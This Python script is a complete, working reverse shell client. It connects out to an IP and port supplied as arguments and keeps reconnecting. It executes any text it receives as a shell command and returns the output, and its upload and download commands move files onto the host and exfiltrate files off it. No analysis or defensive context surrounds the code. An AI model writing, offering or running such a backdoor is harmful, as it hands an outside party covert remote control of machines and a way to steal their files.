import socket
import argparse
import subprocess
import os
import sys
import threading


MAX_BYTES = 1024

def run_shell_cmd(cmd):
    """ Run shell command """
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    cmd_output = process.communicate()[0]
    return cmd_output


def change_dir(path):
    """ change directory if path found otherwise return error to user """
    try:
        os.chdir(path.strip())
    except FileNotFoundError as err:
        return str(err).encode()


def handle_data(client_socket, cmd_func_mapping):
    """ Handle user data """
    client_socket.send(sys.platform.encode())
    try:    
        while True:
            data = client_socket.recv(MAX_BYTES).decode()
            if data.strip() == "exit" or not data:
                break
            cmd = data.split(" ")
            func = cmd_func_mapping.get(cmd[0], None)
            if func:
                func(client_socket, cmd)
                continue
            shell_cmd_thread = threading.Thread(target=shell_command, args=(client_socket, data), daemon=True)
            shell_cmd_thread.start()
    except:
        pass
        

def shell_command(client_socket, data):
    if data.startswith("cd "):
        directory = data.split(" ", 1)[1]
        cmd_output = change_dir(directory)
    else:
        cmd_output = run_shell_cmd(data)
    if not cmd_output:
        cmd_output = b" "
    client_socket.send(cmd_output)



def upload_file(client_socket, cmd):
    if len(cmd) != 3:
        return
    dst_file, file_size = cmd[1], cmd[2]
    try:    
        with open(dst_file, 'wb') as fd:
            remote_file_size = int(file_size)
            local_file_size = 0
            client_socket.send(F"ack".encode())
            while remote_file_size != local_file_size:
                source_data = client_socket.recv(MAX_BYTES)
                local_file_size += len(source_data)
                fd.write(source_data)
    except Exception as e:
        client_socket.send(str(e).encode())
            

def download_file(client_socket, cmd):
    if len(cmd) != 2:
        return
    src_file = cmd[1]
    try:    
        with open(src_file, 'rb') as fd:
            file_size = os.stat(src_file).st_size
            client_socket.send(F"{file_size}".encode())
            if "ack" == client_socket.recv(MAX_BYTES).decode(): # start sending file's data
                while True:
                    content = fd.read(MAX_BYTES)
                    if not content:
                        break
                    client_socket.send(content)
    except Exception as e:
        client_socket.send(str(e).encode())


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str, required=True)
    parser.add_argument('--port', type=int, required=True)
    args = parser.parse_args()
    return args



def main():
    args = get_args()
    cmd_func_mapping = {"download": download_file, "upload": upload_file}
    while 1:    
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((args.ip, args.port))
        except Exception as err:
            print(F"Error occured while trying to connect to server: {err}")
        else:
            handle_data(client_socket, cmd_func_mapping)
        finally:
            client_socket.close()
    
    
        
if __name__ == "__main__":
    main()
